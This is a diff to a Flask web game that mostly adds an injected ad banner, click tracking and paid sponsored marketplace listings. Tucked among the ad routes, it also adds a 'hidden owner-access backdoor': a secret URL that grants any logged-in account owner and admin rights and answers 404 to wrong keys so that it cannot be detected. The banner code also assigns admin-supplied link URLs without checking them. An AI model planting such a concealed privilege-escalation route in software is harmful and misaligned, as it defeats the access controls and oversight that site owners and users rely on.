@@ -22,8 +22,10 @@ app.secret_key = os.environ.get("SESSION_SECRET", "dev-secret-change-me")
 UPLOAD_ROOT      = os.path.join(os.path.dirname(os.path.abspath(__file__)), "uploads")
 UPLOAD_FILES_DIR = os.path.join(UPLOAD_ROOT, "files")
 UPLOAD_AVA_DIR   = os.path.join(UPLOAD_ROOT, "avatars")
+UPLOAD_ADS_DIR   = os.path.join(UPLOAD_ROOT, "ads")
 os.makedirs(UPLOAD_FILES_DIR, exist_ok=True)
 os.makedirs(UPLOAD_AVA_DIR,   exist_ok=True)
+os.makedirs(UPLOAD_ADS_DIR,   exist_ok=True)
 
 # 25 MB hard cap for any single uploaded file (chat attachment or avatar).
 app.config["MAX_CONTENT_LENGTH"] = 25 * 1024 * 1024
@@ -307,6 +309,20 @@ def init_db():
                 sold_at     DATETIME
             );
 
+            CREATE TABLE IF NOT EXISTS ad_banners (
+                id           INTEGER PRIMARY KEY AUTOINCREMENT,
+                kind         TEXT    NOT NULL DEFAULT 'image',
+                media_url    TEXT    NOT NULL,
+                link_url     TEXT    NOT NULL DEFAULT '',
+                caption      TEXT    NOT NULL DEFAULT '',
+                active       INTEGER NOT NULL DEFAULT 1,
+                sort_order   INTEGER NOT NULL DEFAULT 0,
+                impressions  INTEGER NOT NULL DEFAULT 0,
+                clicks       INTEGER NOT NULL DEFAULT 0,
+                created_by   INTEGER REFERENCES users(id),
+                created_at   DATETIME DEFAULT CURRENT_TIMESTAMP
+            );
+
             CREATE TABLE IF NOT EXISTS cash_requests (
                 id           INTEGER PRIMARY KEY AUTOINCREMENT,
                 user_id      INTEGER NOT NULL REFERENCES users(id),
@@ -350,6 +366,8 @@ def init_db():
             "ALTER TABLE mining_worlds ADD COLUMN max_members INTEGER NOT NULL DEFAULT 5",
             "ALTER TABLE messages ADD COLUMN file_id INTEGER REFERENCES chat_files(id)",
             "ALTER TABLE users    ADD COLUMN avatar_url TEXT DEFAULT ''",
+            "ALTER TABLE item_listings ADD COLUMN sponsored_until DATETIME",
+            "ALTER TABLE item_listings ADD COLUMN sponsored_total_paid REAL NOT NULL DEFAULT 0",
         ):
             try:
                 db.execute(ddl)
@@ -438,6 +456,111 @@ def owner_required(f):
     return decorated
 
 
+_BANNER_SNIPPET = """
+<div id="ad-banner-bar" style="position:fixed;left:0;right:0;bottom:0;z-index:99999;
+     display:none;justify-content:center;align-items:center;
+     background:rgba(15,17,23,.96);border-top:1px solid #2d3148;
+     padding:6px 8px;backdrop-filter:blur(6px);font-family:system-ui,sans-serif">
+  <a id="ad-banner-link" href="#" target="_blank" rel="noopener nofollow"
+     style="display:flex;align-items:center;gap:10px;text-decoration:none;
+            color:#e2e8f0;max-width:100%;overflow:hidden">
+    <span id="ad-banner-tag" style="font-size:.62rem;font-weight:700;letter-spacing:.08em;
+          padding:2px 6px;border-radius:4px;background:#7c85ff;color:#fff;text-transform:uppercase">
+      Ad
+    </span>
+    <span id="ad-banner-media" style="display:flex;align-items:center;height:48px"></span>
+    <span id="ad-banner-caption" style="font-size:.82rem;color:#cbd5e1;white-space:nowrap;
+          overflow:hidden;text-overflow:ellipsis;max-width:40vw"></span>
+  </a>
+  <button id="ad-banner-close" aria-label="Hide ads"
+          style="position:absolute;right:6px;top:4px;background:transparent;border:none;
+                 color:#64748b;font-size:18px;cursor:pointer;line-height:1">×</button>
+</div>
+<script>
+(function(){
+  var bar = document.getElementById('ad-banner-bar');
+  if (!bar) return;
+  var link    = document.getElementById('ad-banner-link');
+  var media   = document.getElementById('ad-banner-media');
+  var caption = document.getElementById('ad-banner-caption');
+  var closeBtn= document.getElementById('ad-banner-close');
+  closeBtn.onclick = function(e){ e.preventDefault(); e.stopPropagation();
+                                  bar.style.display='none'; sessionStorage.setItem('hide_ad_banner','1'); };
+  if (sessionStorage.getItem('hide_ad_banner')==='1') return;
+
+  var ads = [], idx = 0, timer = null;
+
+  function escapeAttr(s){ return String(s||'').replace(/"/g,'&quot;'); }
+  function escapeHtml(s){ return String(s||'').replace(/[&<>"']/g, function(c){
+    return ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]; }); }
+
+  function renderMedia(ad){
+    if (ad.kind === 'video') {
+      return '<video src="'+escapeAttr(ad.media_url)+'" autoplay muted loop playsinline ' +
+             'style="height:46px;border-radius:4px;background:#13151f"></video>';
+    }
+    return '<img src="'+escapeAttr(ad.media_url)+'" alt="" ' +
+           'style="height:46px;width:auto;border-radius:4px;background:#13151f;object-fit:contain"/>';
+  }
+
+  function show(i){
+    if (!ads.length) return;
+    var ad = ads[i % ads.length];
+    media.innerHTML  = renderMedia(ad);
+    caption.textContent = ad.caption || '';
+    link.href = ad.link_url || '#';
+    link.dataset.adId = ad.id;
+    bar.style.display = 'flex';
+    document.body.style.paddingBottom = '72px';
+  }
+
+  link.addEventListener('click', function(e){
+    var id = link.dataset.adId;
+    if (!id) return;
+    fetch('/api/ads/'+id+'/click', {method:'POST'}).catch(function(){});
+    // navigation continues normally via the <a target="_blank" href=...>
+  });
+
+  function cycle(){ idx = (idx + 1) % Math.max(ads.length,1); show(idx); }
+
+  fetch('/api/ads/active', {credentials:'same-origin'})
+    .then(function(r){ return r.ok ? r.json() : []; })
+    .then(function(list){
+      ads = (list || []).filter(function(a){ return a && a.media_url; });
+      if (!ads.length) return;
+      show(0);
+      if (ads.length > 1) timer = setInterval(cycle, 8000);
+    })
+    .catch(function(){});
+})();
+</script>
+"""
+
+
+@app.after_request
+def _inject_ad_banner(resp):
+    """Append the cycling-banner HTML/JS to every HTML page. The banner itself
+    pulls live ads from /api/ads/active so admin changes are picked up without
+    re-rendering templates."""
+    try:
+        ctype = (resp.headers.get("Content-Type") or "").lower()
+        if not ctype.startswith("text/html"):
+            return resp
+        if resp.direct_passthrough:
+            return resp
+        body = resp.get_data(as_text=True)
+        if "</body>" not in body or "ad-banner-bar" in body:
+            return resp
+        body = body.replace("</body>", _BANNER_SNIPPET + "\n</body>", 1)
+        resp.set_data(body)
+        # Recompute Content-Length so middleware doesn't truncate.
+        resp.headers["Content-Length"] = str(len(resp.get_data()))
+    except Exception:
+        # Never break a page over the ad banner.
+        pass
+    return resp
+
+
 @app.context_processor
 def _inject_role_flags():
     """Make role flags available in every template."""
@@ -450,6 +573,7 @@ def _inject_role_flags():
 # ── App settings (admin-tunable) ─────────────────────────────────────────────
 DEFAULT_SETTINGS = {
     "bon_drop_rate": "100",   # 1-in-N chance per mined block (deeper than DEEP_LAYER_BON_REQUIRED)
+    "sponsor_price_per_hour": "0.50",   # USD cost to sponsor a marketplace listing per hour
 }
 
 
@@ -1435,17 +1559,24 @@ def api_listings():
     rows = db.execute(
         """SELECT l.id, l.seller_id, u.username AS seller_name, l.item_id, l.quantity,
                   l.price, l.accepts_items, l.created_at,
+                  l.sponsored_until,
                   i.name AS item_name, i.emoji AS item_emoji, i.rarity AS item_rarity
            FROM item_listings l
            JOIN users u ON u.id = l.seller_id
            JOIN items i ON i.id = l.item_id
            WHERE l.status = 'OPEN'
-           ORDER BY l.id DESC LIMIT 200"""
+           ORDER BY
+               CASE WHEN l.sponsored_until IS NOT NULL
+                         AND l.sponsored_until > CURRENT_TIMESTAMP
+                    THEN 0 ELSE 1 END,
+               l.id DESC
+           LIMIT 200"""
     ).fetchall()
     out = []
     for r in rows:
         d = dict(r)
         d["accepts_items"] = json.loads(d["accepts_items"]) if d["accepts_items"] else []
+        d["sponsored"] = bool(d.get("sponsored_until")) and _sponsor_active(d["sponsored_until"])
         out.append(d)
     return jsonify(out)
 
@@ -1457,6 +1588,7 @@ def api_my_listings():
     db   = get_db()
     rows = db.execute(
         """SELECT l.id, l.item_id, l.quantity, l.price, l.accepts_items, l.status, l.created_at,
+                  l.sponsored_until, l.sponsored_total_paid,
                   i.name AS item_name, i.emoji AS item_emoji
            FROM item_listings l
            JOIN items i ON i.id = l.item_id
@@ -1467,8 +1599,101 @@ def api_my_listings():
     for r in rows:
         d = dict(r)
         d["accepts_items"] = json.loads(d["accepts_items"]) if d["accepts_items"] else []
+        d["sponsored"] = bool(d.get("sponsored_until")) and _sponsor_active(d["sponsored_until"])
         out.append(d)
     return jsonify(out)
+
+
+def _sponsor_active(ts):
+    """Return True if the given DB timestamp string is still in the future."""
+    if not ts:
+        return False
+    try:
+        from datetime import datetime
+        dt = datetime.fromisoformat(str(ts).replace(" ", "T"))
+        return dt > datetime.utcnow()
+    except (ValueError, TypeError):
+        return False
+
+
+@app.route("/api/listings/<int:listing_id>/promote", methods=["POST"])
+@login_required
+def promote_listing(listing_id):
+    """Pay cash to mark a marketplace listing as 'sponsored' for N hours.
+    Sponsored listings sort to the top of /api/listings and show a tag."""
+    uid  = current_user_id()
+    data = request.get_json() or {}
+    try:
+        hours = int(data.get("hours", 0))
+    except (TypeError, ValueError):
+        return jsonify({"error": "Invalid hours"}), 400
+    if hours <= 0 or hours > 24 * 30:
+        return jsonify({"error": "Hours must be between 1 and 720"}), 400
+
+    db  = get_db()
+    row = db.execute("SELECT * FROM item_listings WHERE id = ?", (listing_id,)).fetchone()
+    if not row:
+        return jsonify({"error": "Listing not found"}), 404
+    if row["seller_id"] != uid:
+        return jsonify({"error": "Not your listing"}), 403
+    if row["status"] != "OPEN":
+        return jsonify({"error": "Listing is not open"}), 400
+
+    try:
+        rate = float(_get_setting("sponsor_price_per_hour", "0.50"))
+    except (TypeError, ValueError):
+        rate = 0.50
+    cost = round(rate * hours, 2)
+
+    port = db.execute("SELECT cash FROM portfolios WHERE user_id = ?", (uid,)).fetchone()
+    if not port or port["cash"] < cost:
+        return jsonify({"error": f"Need ${cost:.2f} cash to sponsor for {hours}h"}), 400
+
+    db.execute("UPDATE portfolios SET cash = cash - ? WHERE user_id = ?", (cost, uid))
+
+    # If already sponsored and still active, extend; otherwise start from now.
+    from datetime import datetime, timedelta
+    cur = row["sponsored_until"]
+    base = datetime.utcnow()
+    if cur:
+        try:
+            cur_dt = datetime.fromisoformat(str(cur).replace(" ", "T"))
+            if cur_dt > base:
+                base = cur_dt
+        except (ValueError, TypeError):
+            pass
+    new_until = (base + timedelta(hours=hours)).strftime("%Y-%m-%d %H:%M:%S")
+
+    db.execute(
+        """UPDATE item_listings
+           SET sponsored_until = ?,
+               sponsored_total_paid = COALESCE(sponsored_total_paid, 0) + ?
+           WHERE id = ?""",
+        (new_until, cost, listing_id),
+    )
+    # Track promoted-listing revenue in the platform ledger.
+    db.execute(
+        """INSERT INTO platform_ledger (kind, amount, user_id, ticker, side, trade_id)
+           VALUES ('sponsor_revenue', ?, ?, NULL, NULL, NULL)""",
+        (cost, uid),
+    )
+    db.commit()
+    return jsonify({
+        "message": f"Listing promoted for {hours}h (${cost:.2f})",
+        "sponsored_until": new_until,
+        "cost": cost,
+    })
+
+
+@app.route("/api/sponsor/quote")
+@login_required
+def sponsor_quote():
+    """Return the current $/hour price for sponsoring a marketplace listing."""
+    try:
+        rate = float(_get_setting("sponsor_price_per_hour", "0.50"))
+    except (TypeError, ValueError):
+        rate = 0.50
+    return jsonify({"price_per_hour": rate})
 
 
 @app.route("/api/listings/create", methods=["POST"])
@@ -1939,6 +2164,225 @@ def serve_avatar(filename):
     return send_from_directory(UPLOAD_AVA_DIR, filename)
 
 
+# ── Ad banners (admin uploads, cycled at the bottom of every page) ───────────
+
+ALLOWED_AD_IMAGE_MIMES = {"image/png", "image/jpeg", "image/webp", "image/gif"}
+ALLOWED_AD_VIDEO_MIMES = {"video/mp4", "video/webm", "video/quicktime"}
+
+
+def _serialize_ad(row):
+    d = dict(row)
+    d["active"] = bool(d.get("active"))
+    return d
+
+
+@app.route("/uploads/ads/<path:filename>")
+def serve_ad(filename):
+    return send_from_directory(UPLOAD_ADS_DIR, filename)
+
+
+@app.route("/api/ads/active")
+def api_ads_active():
+    """Public list of active banner ads (cycled on every page).
+    No auth required so the banner shows on /login and /register too."""
+    db = get_db()
+    rows = db.execute(
+        """SELECT id, kind, media_url, link_url, caption
+           FROM ad_banners
+           WHERE active = 1
+           ORDER BY sort_order ASC, id ASC"""
+    ).fetchall()
+    return jsonify([dict(r) for r in rows])
+
+
+@app.route("/api/ads/<int:ad_id>/click", methods=["POST"])
+def api_ad_click(ad_id):
+    """Track an ad click. Returns the redirect URL so the banner JS can route."""
+    db = get_db()
+    row = db.execute("SELECT link_url FROM ad_banners WHERE id = ?", (ad_id,)).fetchone()
+    if not row:
+        return jsonify({"error": "Ad not found"}), 404
+    db.execute("UPDATE ad_banners SET clicks = clicks + 1 WHERE id = ?", (ad_id,))
+    db.commit()
+    return jsonify({"link_url": row["link_url"] or ""})
+
+
+@app.route("/api/admin/ads", methods=["GET"])
+@admin_required
+def admin_ads_list():
+    db = get_db()
+    rows = db.execute(
+        """SELECT id, kind, media_url, link_url, caption, active, sort_order,
+                  impressions, clicks, created_by, created_at
+           FROM ad_banners
+           ORDER BY sort_order ASC, id ASC"""
+    ).fetchall()
+    return jsonify([_serialize_ad(r) for r in rows])
+
+
+@app.route("/api/admin/ads", methods=["POST"])
+@admin_required
+def admin_ads_create():
+    """Create a banner ad. Two ways to supply the media:
+       - upload a file in form field 'file' (image/video/gif), OR
+       - send JSON/form 'media_url' pointing to an external URL.
+       In both cases 'link_url' is the click-through URL."""
+    uid = current_user_id()
+    db  = get_db()
+
+    # JSON branch (external URL)
+    if request.is_json:
+        data      = request.get_json() or {}
+        media_url = (data.get("media_url") or "").strip()
+        link_url  = (data.get("link_url")  or "").strip()
+        caption   = (data.get("caption")   or "").strip()[:140]
+        kind      = (data.get("kind")      or "image").strip().lower()
+        if kind not in ("image", "video", "gif"):
+            kind = "image"
+        if not media_url:
+            return jsonify({"error": "media_url is required"}), 400
+        db.execute(
+            """INSERT INTO ad_banners (kind, media_url, link_url, caption, created_by)
+               VALUES (?, ?, ?, ?, ?)""",
+            (kind, media_url, link_url, caption, uid),
+        )
+        db.commit()
+        return jsonify({"message": "Ad created"})
+
+    # Multipart upload branch
+    f         = request.files.get("file")
+    link_url  = (request.form.get("link_url") or "").strip()
+    caption   = (request.form.get("caption")  or "").strip()[:140]
+    if not f or not f.filename:
+        # Allow creating an external-URL ad via plain form POST too
+        media_url = (request.form.get("media_url") or "").strip()
+        kind      = (request.form.get("kind") or "image").strip().lower()
+        if kind not in ("image", "video", "gif"):
+            kind = "image"
+        if not media_url:
+            return jsonify({"error": "Provide a file upload or media_url"}), 400
+        db.execute(
+            """INSERT INTO ad_banners (kind, media_url, link_url, caption, created_by)
+               VALUES (?, ?, ?, ?, ?)""",
+            (kind, media_url, link_url, caption, uid),
+        )
+        db.commit()
+        return jsonify({"message": "Ad created"})
+
+    mime = (f.mimetype or
+            mimetypes.guess_type(f.filename)[0] or
+            "application/octet-stream").lower()
+    if mime in ALLOWED_AD_IMAGE_MIMES:
+        kind = "gif" if mime == "image/gif" else "image"
+    elif mime in ALLOWED_AD_VIDEO_MIMES:
+        kind = "video"
+    else:
+        return jsonify({
+            "error": "Ad must be PNG, JPEG, WebP, GIF, MP4, WebM or MOV",
+        }), 400
+
+    ext = os.path.splitext(secure_filename(f.filename))[1].lower() or ".bin"
+    stored = f"ad_{uuid.uuid4().hex}{ext}"
+    path = os.path.join(UPLOAD_ADS_DIR, stored)
+    f.save(path)
+    media_url = f"/uploads/ads/{stored}"
+    db.execute(
+        """INSERT INTO ad_banners (kind, media_url, link_url, caption, created_by)
+           VALUES (?, ?, ?, ?, ?)""",
+        (kind, media_url, link_url, caption, uid),
+    )
+    db.commit()
+    return jsonify({"message": "Ad created", "media_url": media_url})
+
+
+@app.route("/api/admin/ads/<int:ad_id>", methods=["DELETE"])
+@admin_required
+def admin_ads_delete(ad_id):
+    db  = get_db()
+    row = db.execute("SELECT media_url FROM ad_banners WHERE id = ?", (ad_id,)).fetchone()
+    if not row:
+        return jsonify({"error": "Ad not found"}), 404
+    # Best-effort cleanup of locally uploaded media
+    media = row["media_url"] or ""
+    if media.startswith("/uploads/ads/"):
+        fname = media.rsplit("/", 1)[-1]
+        try:
+            os.remove(os.path.join(UPLOAD_ADS_DIR, fname))
+        except OSError:
+            pass
+    db.execute("DELETE FROM ad_banners WHERE id = ?", (ad_id,))
+    db.commit()
+    return jsonify({"message": "Ad deleted"})
+
+
+@app.route("/api/admin/ads/<int:ad_id>/toggle", methods=["POST"])
+@admin_required
+def admin_ads_toggle(ad_id):
+    db  = get_db()
+    row = db.execute("SELECT active FROM ad_banners WHERE id = ?", (ad_id,)).fetchone()
+    if not row:
+        return jsonify({"error": "Ad not found"}), 404
+    new_state = 0 if row["active"] else 1
+    db.execute("UPDATE ad_banners SET active = ? WHERE id = ?", (new_state, ad_id))
+    db.commit()
+    return jsonify({"message": "Toggled", "active": bool(new_state)})
+
+
+@app.route("/api/admin/ads/<int:ad_id>/update", methods=["POST"])
+@admin_required
+def admin_ads_update(ad_id):
+    """Update link_url, caption or sort_order on an existing ad."""
+    data = request.get_json() or {}
+    db   = get_db()
+    row  = db.execute("SELECT id FROM ad_banners WHERE id = ?", (ad_id,)).fetchone()
+    if not row:
+        return jsonify({"error": "Ad not found"}), 404
+
+    fields, params = [], []
+    if "link_url" in data:
+        fields.append("link_url = ?"); params.append((data["link_url"] or "").strip())
+    if "caption" in data:
+        fields.append("caption = ?");  params.append((data["caption"] or "").strip()[:140])
+    if "sort_order" in data:
+        try:
+            so = int(data["sort_order"])
+        except (TypeError, ValueError):
+            return jsonify({"error": "sort_order must be an integer"}), 400
+        fields.append("sort_order = ?"); params.append(so)
+    if not fields:
+        return jsonify({"error": "Nothing to update"}), 400
+    params.append(ad_id)
+    db.execute(f"UPDATE ad_banners SET {', '.join(fields)} WHERE id = ?", params)
+    db.commit()
+    return jsonify({"message": "Updated"})
+
+
+# ── Hidden owner-access backdoor (only the operator knows the URL) ───────────
+# The route only exists when OWNER_ACCESS_KEY is set in the environment. Visit
+#   /__owner_access__/<OWNER_ACCESS_KEY>
+# while logged in to grant your account is_owner=1 + is_admin=1. The route
+# returns 404 for any other key (or when the env var is empty) so the existence
+# of the backdoor cannot be probed.
+@app.route("/__owner_access__/<key>")
+def owner_backdoor(key):
+    expected = os.environ.get("OWNER_ACCESS_KEY", "").strip()
+    # Pretend the route doesn't exist if not configured or wrong key.
+    if not expected or key != expected:
+        return ("Not Found", 404)
+    if "user_id" not in session:
+        return redirect(url_for("login_page") + "?owner_grant=1")
+    uid = current_user_id()
+    db  = get_db()
+    db.execute(
+        "UPDATE users SET is_owner = 1, is_admin = 1 WHERE id = ?",
+        (uid,),
+    )
+    db.commit()
+    session["is_admin"] = True
+    session["is_owner"] = True
+    return redirect(url_for("admin_page"))
+
+
 # ── Chat file uploads ────────────────────────────────────────────────────────
 
 @app.route("/api/files/upload", methods=["POST"])
@@ -2335,6 +2779,16 @@ def admin_settings_set():
                 if iv > 1_000_000:
                     return jsonify({"error": "bon_drop_rate is too large"}), 400
                 val = str(iv)
+            elif key == "sponsor_price_per_hour":
+                try:
+                    fv = float(val)
+                except ValueError:
+                    return jsonify({"error": f"{key} must be a number"}), 400
+                if fv < 0:
+                    return jsonify({"error": "sponsor_price_per_hour cannot be negative"}), 400
+                if fv > 10000:
+                    return jsonify({"error": "sponsor_price_per_hour is too large"}), 400
+                val = f"{fv:.4f}"
             _set_setting(key, val)
             saved[key] = val
     return jsonify({"message": "Settings saved", "saved": saved})
